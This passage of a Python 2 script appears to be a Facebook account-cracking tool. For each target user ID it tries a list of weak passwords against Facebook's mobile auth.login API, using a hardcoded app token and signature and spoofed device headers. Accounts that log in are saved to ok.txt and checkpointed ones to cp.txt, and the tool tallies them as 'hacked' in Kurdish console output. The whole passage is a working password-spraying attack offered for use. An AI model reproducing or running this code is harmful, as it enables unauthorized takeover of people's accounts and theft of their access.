                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-http-engine': 'Liger' }
            data = requests.get(api, params = params, headers = headers_)
            if 'access_token' in data.text and 'EAAA' in data.text:
                print ' \x1b[1;32m[TIGER-OK] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('ok.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in data.json()['error_msg']:
                print ' \x1b[1;31m[TIGER-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('cp.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = '123'
                api = 'https://b-api.facebook.com/method/auth.login'
                params = {
                    'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                    'format': 'JSON',
                    'sdk_version': '2',
                    'email': uid,
                    'locale': 'en_US',
                    'password': pass2,
                    'sdk': 'ios',
                    'generate_session_cookies': '1',
                    'sig': '3f555f99fb61fcd7aa0c44f58f522ef6' }
                headers_ = {
                    'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                    'x-fb-sim-hni': str(random.randint(20000, 40000)),
                    'x-fb-net-hni': str(random.randint(20000, 40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': _azimua,
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger' }
                data = requests.get(api, params = params, headers = headers_)
                if 'access_token' in data.text and 'EAAA' in data.text:
                    print ' \x1b[1;32m[TIGER-OK] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('ok.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in data.json()['error_msg']:
                    print ' \x1b[1;31m[TIGER-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('cp.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = '12'
                    api = 'https://b-api.facebook.com/method/auth.login'
                    params = {
                        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                        'format': 'JSON',
                        'sdk_version': '2',
                        'email': uid,
                        'locale': 'en_US',
                        'password': pass3,
                        'sdk': 'ios',
                        'generate_session_cookies': '1',
                        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6' }
                    headers_ = {
                        'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                        'x-fb-sim-hni': str(random.randint(20000, 40000)),
                        'x-fb-net-hni': str(random.randint(20000, 40000)),
                        'x-fb-connection-quality': 'EXCELLENT',
                        'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                        'user-agent': _azimua,
                        'content-type': 'application/x-www-form-urlencoded',
                        'x-fb-http-engine': 'Liger' }
                    data = requests.get(api, params = params, headers = headers_)
                    if 'access_token' in data.text and 'EAAA' in data.text:
                        print ' \x1b[1;32m[TIGER-OK] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('ok.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in data.json()['error_msg']:
                        print ' \x1b[1;31m[TIGER-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('cp.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = '12345'
                        api = 'https://b-api.facebook.com/method/auth.login'
                        params = {
                            'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                            'format': 'JSON',
                            'sdk_version': '2',
                            'email': uid,
                            'locale': 'en_US',
                            'password': pass4,
                            'sdk': 'ios',
                            'generate_session_cookies': '1',
                            'sig': '3f555f99fb61fcd7aa0c44f58f522ef6' }
                        headers_ = {
                            'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                            'x-fb-sim-hni': str(random.randint(20000, 40000)),
                            'x-fb-net-hni': str(random.randint(20000, 40000)),
                            'x-fb-connection-quality': 'EXCELLENT',
                            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                            'user-agent': _azimua,
                            'content-type': 'application/x-www-form-urlencoded',
                            'x-fb-http-engine': 'Liger' }
                        data = requests.get(api, params = params, headers = headers_)
                        if 'access_token' in data.text and 'EAAA' in data.text:
                            print ' \x1b[1;32m[TIGER-OK] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('ok.txt', 'a')
                            ok.write(uid + '|' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in data.json()['error_msg']:
                            print ' \x1b[1;31m[TIGER-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            cp = open('cp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                        else:
                            pass5 = '123456'
                            api = 'https://b-api.facebook.com/method/auth.login'
                            params = {
                                'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                                'format': 'JSON',
                                'sdk_version': '2',
                                'email': uid,
                                'locale': 'en_US',
                                'password': pass5,
                                'sdk': 'ios',
                                'generate_session_cookies': '1',
                                'sig': '3f555f99fb61fcd7aa0c44f58f522ef6' }
                            headers_ = {
                                'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                                'x-fb-sim-hni': str(random.randint(20000, 40000)),
                                'x-fb-net-hni': str(random.randint(20000, 40000)),
                                'x-fb-connection-quality': 'EXCELLENT',
                                'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                                'user-agent': _azimua,
                                'content-type': 'application/x-www-form-urlencoded',
                                'x-fb-http-engine': 'Liger' }
                            data = requests.get(api, params = params, headers = headers_)
                            if 'access_token' in data.text and 'EAAA' in data.text:
                                print ' \x1b[1;32m[TIGER-OK] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('ok.txt', 'a')
                                ok.write(uid + '|' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in data.json()['error_msg']:
                                print ' \x1b[1;31m[TIGER-CP] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                cp = open('cp.txt', 'a')
                                cp.write(uid + '|' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
                            else:
                                pass6 = '112233'
                                api = 'https://b-api.facebook.com/method/auth.login'
                                params = {
                                    'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                                    'format': 'JSON',
                                    'sdk_version': '2',
                                    'email': uid,
                                    'locale': 'en_US',
                                    'password': pass6,
                                    'sdk': 'ios',
                                    'generate_session_cookies': '1',
                                    'sig': '3f555f99fb61fcd7aa0c44f58f522ef6' }
                                headers_ = {
                                    'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                                    'x-fb-sim-hni': str(random.randint(20000, 40000)),
                                    'x-fb-net-hni': str(random.randint(20000, 40000)),
                                    'x-fb-connection-quality': 'EXCELLENT',
                                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                                    'user-agent': _azimua,
                                    'content-type': 'application/x-www-form-urlencoded',
                                    'x-fb-http-engine': 'Liger' }
                                data = requests.get(api, params = params, headers = headers_)
                                if 'access_token' in data.text and 'EAAA' in data.text:
                                    print ' \x1b[1;32m[TIGER-OK] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('ok.txt', 'a')
                                    ok.write(uid + '|' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in data.json()['error_msg']:
                                    print ' \x1b[1;31m[TIGER-CP] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    cp = open('cp.txt', 'a')
                                    cp.write(uid + '|' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid + pass6)
                                else:
                                    pass7 = '123356789'
                                    api = 'https://b-api.facebook.com/method/auth.login'
                                    params = {
                                        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                                        'format': 'JSON',
                                        'sdk_version': '2',
                                        'email': uid,
                                        'locale': 'en_US',
                                        'password': pass7,
                                        'sdk': 'ios',
                                        'generate_session_cookies': '1',
                                        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6' }
                                    headers_ = {
                                        'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                                        'x-fb-sim-hni': str(random.randint(20000, 40000)),
                                        'x-fb-net-hni': str(random.randint(20000, 40000)),
                                        'x-fb-connection-quality': 'EXCELLENT',
                                        'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                                        'user-agent': _azimua,
                                        'content-type': 'application/x-www-form-urlencoded',
                                        'x-fb-http-engine': 'Liger' }
                                    data = requests.get(api, params = params, headers = headers_)
                                    if 'access_token' in data.text and 'EAAA' in data.text:
                                        print ' \x1b[1;32m[TIGER-OK] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + '|' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in data.json()['error_msg']:
                                        print ' \x1b[1;31m[TIGER-CP] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + '|' + pass7 + '\n')
                                        cp.close()
                                        cps.append(uid + pass7)
        except:
            pass
        


    p = ThreadPool()
    p.map(main, id)
    print ''
    linex()
    print ''
    print '\x1b[92;1m CRACK KOTAY HAT [!]'
    print '\x1b[93;1m HAMW HACKRAWAKAN [!] \x1b[92;1m[OK]\x1b[93;1m/\x1b[91;1m[CP]: ' + str(len(oks)) + '/' + str(len(cps))
    print ''
    linex()
    print ''
    raw_input('\x1b[94;1m  ENTER BKA BO GARANAWA [!] ')
    menu()

if __name__ == '__main__':
    main()
